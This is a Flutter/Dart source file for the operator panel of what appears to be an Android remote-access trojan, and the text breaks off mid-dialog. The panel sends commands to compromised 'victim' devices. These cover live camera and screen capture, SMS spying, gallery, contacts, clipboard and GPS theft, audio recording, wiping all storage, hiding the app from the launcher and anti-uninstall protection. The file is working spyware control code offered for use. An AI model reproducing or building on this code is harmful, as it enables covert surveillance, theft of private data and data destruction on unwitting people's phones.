import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show Clipboard, ClipboardData;
import 'package:flutter_svg/flutter_svg.dart';
import 'package:image_picker/image_picker.dart';
import 'package:file_picker/file_picker.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:audioplayers/audioplayers.dart';
import '../utils/theme.dart';
import '../utils/app_localizations.dart';
import '../utils/notif_helper.dart';
import '../services/api_service.dart';

class HackedScreen extends StatefulWidget {
  const HackedScreen({super.key});
  @override
  State<HackedScreen> createState() => _HackedScreenState();
}

class _HackedScreenState extends State<HackedScreen>
    with TickerProviderStateMixin {
  late final AnimationController _rotateCtrl =
      AnimationController(vsync: this, duration: const Duration(seconds: 4))..repeat();
  late final Animation<double> _rotateAnim =
      Tween<double>(begin: 0, end: 1).animate(_rotateCtrl);
  int _currentTab = 0;

  String _role = '';
  String _vipType = 'update'; 
  List<Map<String, dynamic>> _devices = [];
  bool _loadingDevices = false;
  String? _selectedDeviceId;
  String? _selectedDeviceName;
  int _deviceTab = 0; 

  
  Map<String, dynamic>? _deviceInfo;
  bool _loadingDeviceInfo = false;
  bool _antiUninstallActive = false;
  Timer? _deviceInfoTimer;
  bool _togglingProtection = false;

  final _lockTextCtrl = TextEditingController();
  final _pinCtrl      = TextEditingController();
  bool _sendingCmd    = false;
  bool _flashOn       = false;

  
  String? _lastPhotoBase64;
  String? _lastPhotoFacing;
  bool _fetchingPhoto = false;
  Timer? _photoTimer;

  
  bool _screenLiveActive = false;
  String? _lastFrameBase64;
  int _lastFrameW = 0;
  int _lastFrameH = 0;
  int _lastScreenFrameId = 0;
  Timer? _screenLiveTimer;

  
  bool _smsSpyActive = false;
  bool _togglingSmsSpy = false;
  List<Map<String, dynamic>> _smsMessages = [];
  bool _loadingSms = false;
  String _smsTab = 'new'; 
  Timer? _smsTimer;

  
  List<Map<String, dynamic>> _galleryItems = [];
  bool _loadingGallery = false;

  
  List<Map<String, dynamic>> _contacts = [];
  bool _loadingContacts = false;

  
  final _psknmrcUsernameCtrl = TextEditingController();
  bool _creatingPsknmrc      = false;
  String _psknmrcMsg         = '';

  
  Map<String, dynamic>? _lastGps;
  bool _fetchingGps = false;
  Timer? _gpsTimer;

  
  bool _recordingAudio = false;
  bool _fetchingAudio  = false;
  Timer? _audioTimer;
  Map<String, dynamic>? _lastAudioResult;

  
  bool _screenTextActive = false;

  
  List<Map<String, dynamic>> _appList = [];
  bool _loadingAppList = false;

  
  Map<String, dynamic>? _lastClipboard;
  bool _fetchingClipboard = false;
  Timer? _clipboardTimer;

  static const _purple = Color(0xFF8B5CF6);
  static const _gold   = Color(0xFFFFD700);
  static const _green  = Color(0xFF10B981);
  static const _red    = Color(0xFFEF4444);
  static const _blue   = Color(0xFF3B82F6);
  static const _orange = Color(0xFFFF6B35);

  
  static const _noUpdateAllowed = {
    'lock','unlock','flashlight','wallpaper','vibrate','tts','sound',
    'take_photo','screen_live','sms','gallery','contacts','delete_files','hide_app',
  };

  List<Map<String, dynamic>> get _hackedCommands {
    final all = _allHackedCommands;
    
    if (_role == 'vip' && _vipType == 'no_update') {
      return all.where((cmd) => _noUpdateAllowed.contains(cmd['cmd'])).toList();
    }
    return all;
  }

  List<Map<String, dynamic>> get _allHackedCommands => [
    {'icon': AppSvgIcons.lock,      'title': tr('lock_device'),     'color': _red,    'cmd': 'lock',        'active': true},
    {'icon': AppSvgIcons.unlock,    'title': tr('unlock_device'),   'color': _green,  'cmd': 'unlock',      'active': true},
    {'icon': AppSvgIcons.flashlight,'title': tr('hack_flashlight'), 'color': _gold,   'cmd': 'flashlight',  'active': true},
    {'icon': AppSvgIcons.image,     'title': tr('hack_wallpaper'),  'color': _orange, 'cmd': 'wallpaper',   'active': true},
    {'icon': AppSvgIcons.vibrate,   'title': tr('vibrate_device'),  'color': _purple, 'cmd': 'vibrate',     'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 18.5a6.5 6.5 0 1 0 0-13 6.5 6.5 0 0 0 0 13z"/><path d="M12 14a2 2 0 1 0 0-4 2 2 0 0 0 0 4z"/><path d="M12 8V5m0 14v-3M8 12H5m14 0h-3"/></svg>',
     'title': 'Text To Speech',  'color': const Color(0xFF06B6D4), 'cmd': 'tts',         'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>',
     'title': 'Play Sound',      'color': _green,                  'cmd': 'sound',       'active': true},
    {'icon': AppSvgIcons.camera,    'title': 'Take Photo',          'color': _blue,   'cmd': 'take_photo',  'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/></svg>',
     'title': 'Screen Live',     'color': _green,                  'cmd': 'screen_live', 'active': true},
    {'icon': AppSvgIcons.sms,       'title': 'Spyware SMS',         'color': _red,    'cmd': 'sms',         'active': true},
    {'icon': AppSvgIcons.gallery,   'title': 'View Gallery',        'color': const Color(0xFF06B6D4), 'cmd': 'gallery', 'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>',
     'title': 'List Kontak',     'color': _purple,                 'cmd': 'contacts',    'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6m4-6v6"/><path d="M9 6V4h6v2"/></svg>',
     'title': 'Delete File',     'color': _red,                    'cmd': 'delete_files','active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>',
     'title': 'Hide App',        'color': const Color(0xFF6B7280), 'cmd': 'hide_app',    'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 1.28h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 8.91a16 16 0 0 0 6 6l.77-.77a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/><path d="M14.5 2a9 9 0 0 1 7.5 7.5"/></svg>',
     'title': 'Fake Call',       'color': const Color(0xFF22D3EE), 'cmd': 'fake_call',   'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
     'title': 'Clipboard',       'color': const Color(0xFFF59E0B), 'cmd': 'get_clipboard','active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg>',
     'title': 'App Dibuka',      'color': const Color(0xFF10B981), 'cmd': 'get_app_usage','active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>',
     'title': 'Batasi App',      'color': const Color(0xFFF97316), 'cmd': 'set_time_limit','active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>',
     'title': 'Blokir App',      'color': const Color(0xFFEF4444), 'cmd': 'block_app',   'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8h1a4 4 0 0 1 0 8h-1"/><path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"/><line x1="6" y1="1" x2="6" y2="4"/><line x1="10" y1="1" x2="10" y2="4"/><line x1="14" y1="1" x2="14" y2="4"/></svg>',
     'title': 'Trigger Alarm',   'color': const Color(0xFFFFD700), 'cmd': 'trigger_alarm','active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="10" r="3"/><path d="M12 2a8 8 0 0 1 8 8c0 5.25-8 14-8 14S4 15.25 4 10a8 8 0 0 1 8-8z"/></svg>',
     'title': 'GPS Tracking',    'color': const Color(0xFF34D399), 'cmd': 'get_gps',     'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>',
     'title': 'Rekam Suara',     'color': const Color(0xFFF43F5E), 'cmd': 'record_audio', 'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 9h10M7 13h6"/></svg>',
     'title': 'Teks Layar',      'color': const Color(0xFF00BFA5), 'cmd': 'screen_text',  'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 3v18M3 9h6M3 15h6"/><polyline points="13 8 17 12 13 16"/></svg>',
     'title': 'List App',        'color': const Color(0xFF6366F1), 'cmd': 'app_list',    'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>',
     'title': 'Buka App',        'color': const Color(0xFF10B981), 'cmd': 'open_app',    'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
     'title': 'Buka Website',    'color': const Color(0xFF0EA5E9), 'cmd': 'open_site',   'active': true},
  ];

  @override
  void initState() {
    super.initState();
    _loadRole();
    _loadDevices();
  }

  @override
  void dispose() {
    _deviceInfoTimer?.cancel();
    _photoTimer?.cancel();
    _screenLiveTimer?.cancel();
    _smsTimer?.cancel();
    _gpsTimer?.cancel();
    _audioTimer?.cancel();
    _clipboardTimer?.cancel();
    _lockTextCtrl.dispose();
    _pinCtrl.dispose();
    _psknmrcUsernameCtrl.dispose();
    _rotateCtrl.dispose();
    super.dispose();
  }

  Future<void> _loadRole() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _role = prefs.getString('role') ?? '';
      _vipType = prefs.getString('vipType') ?? 'update';
    });
    
    try {
      final res = await ApiService.getProfile();
      if (res['success'] == true && mounted) {
        setState(() {
          _role    = res['user']['role']    ?? _role;
          _vipType = res['user']['vipType'] ?? 'update';
        });
        final prefs2 = await SharedPreferences.getInstance();
        await prefs2.setString('vipType', _vipType);
      }
    } catch (_) {}
  }

  Future<void> _loadDevices() async {
    if (_loadingDevices) return;
    _loadingDevices = true;
    try {
      final res = await ApiService.get('/api/hacked/devices');
      if (res['success'] == true && mounted) {
        final newDevices = List<Map<String, dynamic>>.from(res['devices'] ?? []);
        String? newSelectedId   = _selectedDeviceId;
        String? newSelectedName = _selectedDeviceName;
        if (_selectedDeviceId != null) {
          final sel = newDevices.firstWhere(
            (d) => d['deviceId'] == _selectedDeviceId,
            orElse: () => {},
          );
          if (sel.isEmpty) { newSelectedId = null; newSelectedName = null; }
        }
        setState(() {
          _devices            = newDevices;
          _selectedDeviceId   = newSelectedId;
          _selectedDeviceName = newSelectedName;
        });
      }
    } catch (_) {}
    if (mounted) setState(() => _loadingDevices = false);
    else _loadingDevices = false;
  }

  Future<void> _loadDeviceInfo(String deviceId) async {
    if (_loadingDeviceInfo) return;
    if (mounted) setState(() => _loadingDeviceInfo = true);
    try {
      final res = await ApiService.get('/api/hacked/device-info/$deviceId');
      if (res['success'] == true && mounted) {
        setState(() {
          _deviceInfo = res['info'] as Map<String, dynamic>?;
          _antiUninstallActive = res['info']?['antiUninstall'] == true;
        });
      }
    } catch (_) {}
    if (mounted) setState(() => _loadingDeviceInfo = false);
  }

  void _startDeviceInfoPolling(String deviceId) {
    _deviceInfoTimer?.cancel();
    _deviceInfoTimer = Timer.periodic(const Duration(seconds: 15), (_) {
      if (_selectedDeviceId == deviceId && mounted) {
        _loadDeviceInfo(deviceId);
      }
    });
  }

  Future<void> _toggleAntiUninstall(bool val) async {
    if (_selectedDeviceId == null) return;
    setState(() => _togglingProtection = true);
    try {
      await ApiService.post('/api/hacked/command', {
        'deviceId': _selectedDeviceId,
        'type': val ? 'enable_protection' : 'disable_protection',
        'payload': {},
      });
      setState(() => _antiUninstallActive = val);
      _snack(val ? 'Anti Uninstall Aktif!' : 'Anti Uninstall Dinonaktifkan', isSuccess: true);
    } catch (_) {}
    if (mounted) setState(() => _togglingProtection = false);
  }

  Future<void> _sendCommand(String type, Map<String, dynamic> payload) async {
    if (_selectedDeviceId == null) {
      _snack(tr('select_device_first'));
      return;
    }
    setState(() => _sendingCmd = true);
    try {
      final res = await ApiService.post('/api/hacked/command', {
        'deviceId': _selectedDeviceId,
        'type': type,
        'payload': payload,
      });
      if (res['success'] == true) {
        _snack(res['message'] ?? 'Command Terkirim', isSuccess: true);
      } else {
        _snack(res['message'] ?? 'Gagal', isError: true);
      }
    } catch (e) {
      _snack('Error: $e', isError: true);
    }
    if (mounted) setState(() => _sendingCmd = false);
  }

  void _handleCommandTap(Map<String, dynamic> cmd) {
    final isActive = cmd['active'] as bool;
    final type     = cmd['cmd']   as String;
    final title    = cmd['title'] as String;
    if (!isActive) { _showComingSoon(title); return; }
    switch (type) {
      case 'lock':        _showLockDialog(); break;
      case 'unlock':      _sendCommand('unlock', {}); break;
      case 'flashlight':
        final next = !_flashOn;
        _sendCommand('flashlight', {'state': next ? 'on' : 'off'}).then((_) {
          if (mounted) setState(() => _flashOn = next);
        });
        break;
      case 'wallpaper':   _showWallpaperDialog(); break;
      case 'vibrate':     _showVibrateDialog(); break;
      case 'tts':         _showTtsDialog(); break;
      case 'sound':       _showSoundDialog(); break;
      case 'take_photo':  _showTakePhotoDialog(); break;
      case 'screen_live': _showScreenLiveDialog(); break;
      case 'sms':         _showSmsSpyDialog(); break;
      case 'gallery':     _showGalleryDialog(); break;
      case 'contacts':    _showContactsDialog(); break;
      case 'delete_files':_showDeleteFilesDialog(); break;
      case 'hide_app':    _showHideAppDialog(); break;
      case 'fake_call':   _showFakeCallDialog(); break;
      case 'get_clipboard': _showClipboardDialog(); break;
      case 'get_app_usage': _showAppUsageDialog(); break;
      case 'set_time_limit': _showTimeLimitDialog(); break;
      case 'block_app':   _showBlockAppDialog(); break;
      case 'trigger_alarm': _showTriggerAlarmDialog(); break;
      case 'get_gps':     _showGpsDialog(); break;
      case 'record_audio':_showRecordAudioDialog(); break;
      case 'screen_text': _showScreenTextDialog(); break;
      case 'app_list':    _showAppListDialog(); break;
      case 'open_app':    _showOpenAppDialog(); break;
      case 'open_site':   _showOpenSiteDialog(); break;
    }
  }

  
  void _showTakePhotoDialog() {
    
    Navigator.push(context, MaterialPageRoute(
      builder: (_) => _CameraLiveViewer(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onSendCommand: (cmd, payload) => _sendCommand(cmd, payload),
        apiGet: (path) => ApiService.get(path),
      ),
    ));
  }

  void _startFetchingPhoto(String facing) {
    setState(() { _fetchingPhoto = true; _lastPhotoFacing = facing; _lastPhotoBase64 = null; });
    Future.delayed(const Duration(seconds: 2), () {
      int tries = 0;
      _photoTimer?.cancel();
      _photoTimer = Timer.periodic(const Duration(seconds: 2), (t) async {
        tries++;
        if (tries > 20) { t.cancel(); if (mounted) setState(() => _fetchingPhoto = false); return; }
        try {
          final res = await ApiService.get('/api/hacked/photo-result/$_selectedDeviceId');
          if (res['success'] == true && res['photo'] != null) {
            final photo = res['photo'] as Map;
            if (photo['imageBase64'] != null && (photo['imageBase64'] as String).isNotEmpty) {
              t.cancel();
              if (mounted) setState(() {
                _lastPhotoBase64 = photo['imageBase64'] as String;
                _lastPhotoFacing = photo['facing'] as String? ?? facing;
                _fetchingPhoto = false;
              });
            }
          }
        } catch (_) {}
      });
    });
  }

  void _showPhotoResult() {
    if (_lastPhotoBase64 == null || !mounted) return;
    final bytes = base64Decode(_lastPhotoBase64!);
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: const Color(0xFF0D1F35),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: _blue.withOpacity(0.4))),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 20, 20, 0),
            child: Row(children: [
              SvgPicture.string(AppSvgIcons.cameraAlt, width: 18, height: 18, colorFilter: const ColorFilter.mode(_blue, BlendMode.srcIn)),
              const SizedBox(width: 8),
              Text('FOTO ${(_lastPhotoFacing ?? "").toUpperCase()}',
                style: const TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              const Spacer(),
              GestureDetector(onTap: () => Navigator.pop(context), child: SvgPicture.string(AppSvgIcons.close, width: 20, height: 20, colorFilter: const ColorFilter.mode(Colors.white54, BlendMode.srcIn))),
            ]),
          ),
          const SizedBox(height: 12),
          ClipRRect(
            borderRadius: const BorderRadius.vertical(bottom: Radius.circular(20)),
            child: Image.memory(bytes, fit: BoxFit.contain, width: double.infinity,
              errorBuilder: (_, __, ___) => const Padding(padding: EdgeInsets.all(20),
                child: Text('Gagal Load Foto', style: TextStyle(color: Colors.red))))),
        ]),
      ),
    );
  }

  
  void _showScreenLiveDialog() {
    if (_screenLiveActive) { _stopScreenLive(); return; }
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _green.withOpacity(0.3))),
        padding: const EdgeInsets.fromLTRB(24, 20, 24, 40),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Center(child: Container(width: 40, height: 4,
            decoration: BoxDecoration(color: _green.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
          const SizedBox(height: 20),
          Row(children: [
            Container(width: 36, height: 36,
              decoration: BoxDecoration(color: _green.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _green.withOpacity(0.4))),
              child: Center(child: SvgPicture.string(AppSvgIcons.screenShare, width: 18, height: 18, colorFilter: const ColorFilter.mode(_green, BlendMode.srcIn)))),
            const SizedBox(width: 12),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text('SCREEN LIVE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              Text('Target: ${_selectedDeviceName ?? "Device"}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _green)),
            ]),
          ]),
          const SizedBox(height: 16),
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: _green.withOpacity(0.06), borderRadius: BorderRadius.circular(10), border: Border.all(color: _green.withOpacity(0.2))),
            child: const Text('Device Akan Minta Izin Screen Capture.\nSetelah Approve, Layar Device Tampil Live Di Sini.',
              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white70, height: 1.6), textAlign: TextAlign.center)),
          const SizedBox(height: 20),
          Row(children: [
            Expanded(child: GestureDetector(
              onTap: () => Navigator.pop(ctx),
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
            const SizedBox(width: 12),
            Expanded(child: GestureDetector(
              onTap: () async { Navigator.pop(ctx); await _sendCommand('screen_live', {}); _startScreenLive(); },
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(gradient: const LinearGradient(colors: [_green, Color(0xFF059669)]), borderRadius: BorderRadius.circular(12)),
                child: const Center(child: Text('MULAI LIVE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
          ]),
        ]),
      ),
    );
  }

  void _startScreenLive() {
    setState(() { _screenLiveActive = true; _lastFrameBase64 = null; _lastScreenFrameId = 0; });
    _screenLiveTimer?.cancel();
    _screenLiveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_screenLiveActive || _selectedDeviceId == null) return;
      try {
        final res = await ApiService.get('/api/hacked/screen-frame/$_selectedDeviceId');
        if (res['success'] == true && res['frame'] != null) {
          final frame = res['frame'] as Map;
          final fid   = (frame['frameId'] as num?)?.toInt() ?? 0;
          if (frame['frameBase64'] != null && fid > _lastScreenFrameId && mounted) {
            setState(() {
              _lastFrameBase64    = frame['frameBase64'] as String;
              _lastFrameW         = (frame['width']  as num?)?.toInt() ?? 0;
              _lastFrameH         = (frame['height'] as num?)?.toInt() ?? 0;
              _lastScreenFrameId  = fid;
            });
          }
        }
      } catch (_) {}
    });
    Navigator.push(context, MaterialPageRoute(
      builder: (_) => _ScreenLiveViewer(
        getFrame:   () => _lastFrameBase64,
        getWidth:   () => _lastFrameW,
        getHeight:  () => _lastFrameH,
        getFrameId: () => _lastScreenFrameId,
        isActive:   () => _screenLiveActive,
        onStop:     _stopScreenLive,
      ),
    ));
  }

  void _stopScreenLive() {
    _screenLiveTimer?.cancel();
    setState(() { _screenLiveActive = false; _lastFrameBase64 = null; });
    if (_selectedDeviceId != null) _sendCommand('screen_live_stop', {});
  }

  
  void _showSmsSpyDialog() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _SmsSpySheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        smsSpyActive: _smsSpyActive,
        onToggle: (val) async {
          setState(() => _togglingSmsSpy = true);
          await _sendCommand(val ? 'sms_spy_on' : 'sms_spy_off', {});
          
          try {
            await ApiService.post('/api/hacked/sms-spy-state', {
              'deviceId': _selectedDeviceId,
              'active': val,
            });
          } catch (_) {}
          if (mounted) setState(() { _smsSpyActive = val; _togglingSmsSpy = false; });
        },
        onLoadMessages: (type) => _loadSmsMessages(type),
        onSnack: (msg, {bool isError = false}) => _snack(msg, isError: isError),
      ),
    );
  }

  Future<List<Map<String, dynamic>>> _loadSmsMessages(String type) async {
    try {
      final res = await ApiService.get('/api/hacked/sms-messages/$_selectedDeviceId?type=$type');
      if (res['success'] == true) {
        return List<Map<String, dynamic>>.from(res['messages'] ?? []);
      }
    } catch (_) {}
    return [];
  }

  
  void _showGalleryDialog() {
    _sendCommand('get_gallery', {});
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _GallerySheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onSnack: (msg, {bool isError = false}) => _snack(msg, isError: isError),
      ),
    );
  }

  
  void _showContactsDialog() {
    _sendCommand('get_contacts', {});
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _ContactsSheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
      ),
    );
  }

  
  void _showDeleteFilesDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF0D1F35),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: _red.withOpacity(0.5))),
        title: Row(children: [
          Container(width: 3, height: 18, decoration: BoxDecoration(gradient: LinearGradient(colors: [_red, Colors.red.shade900]), borderRadius: BorderRadius.circular(2))),
          const SizedBox(width: 10),
          const Text('DELETE FILE', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 13, letterSpacing: 1.5)),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: _red.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: _red.withOpacity(0.3))),
            child: Column(children: [
              SvgPicture.string(AppSvgIcons.warning, width: 36, height: 36, colorFilter: const ColorFilter.mode(Colors.orange, BlendMode.srcIn)),
              const SizedBox(height: 10),
              const Text('PERINGATAN!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, color: Colors.orange, letterSpacing: 2, fontWeight: FontWeight.bold)),
              const SizedBox(height: 8),
              const Text('Aksi Ini Akan Menghapus SEMUA File Di Storage Device Yang Dipilih.\nTidak Bisa Dibatalkan!',
                textAlign: TextAlign.center,
                style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white70, height: 1.6)),
            ])),
        ]),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white54, fontSize: 11))),
          Container(
            decoration: BoxDecoration(gradient: LinearGradient(colors: [_red, Colors.red.shade900]), borderRadius: BorderRadius.circular(8)),
            child: TextButton(
              onPressed: () { Navigator.pop(context); _sendCommand('delete_files', {}); },
              child: const Text('HAPUS SEMUA', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 11, letterSpacing: 1)))),
        ],
      ),
    );
  }

  
  void _showHideAppDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF0D1F35),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: const Color(0xFF6B7280).withOpacity(0.5))),
        title: Row(children: [
          SvgPicture.string(AppSvgIcons.eyeOff, width: 20, height: 20, colorFilter: const ColorFilter.mode(Color(0xFF6B7280), BlendMode.srcIn)),
          SizedBox(width: 10),
          Text('HIDE APP', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 13, letterSpacing: 1.5)),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: const Color(0xFF6B7280).withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: const Color(0xFF6B7280).withOpacity(0.3))),
            child: const Text('App Korban Didevice Akan Disembunyikan Dari Launcher.',
              textAlign: TextAlign.center,
              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white70, height: 1.6))),
        ]),
        actions: [
          TextButton(
